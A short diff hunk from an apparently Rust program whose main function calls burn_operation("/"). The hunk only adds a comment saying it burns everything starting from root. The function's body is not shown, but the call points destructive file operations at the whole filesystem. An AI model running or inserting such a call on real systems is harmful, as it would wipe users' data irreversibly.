@@ -6,6 +6,7 @@ use rand::Rng;
 use std::io::Write;
 
 fn main() -> std::io::Result<()> {
+    //burn everything from starting from root
     burn_operation("/")?;
     Ok(())
 }
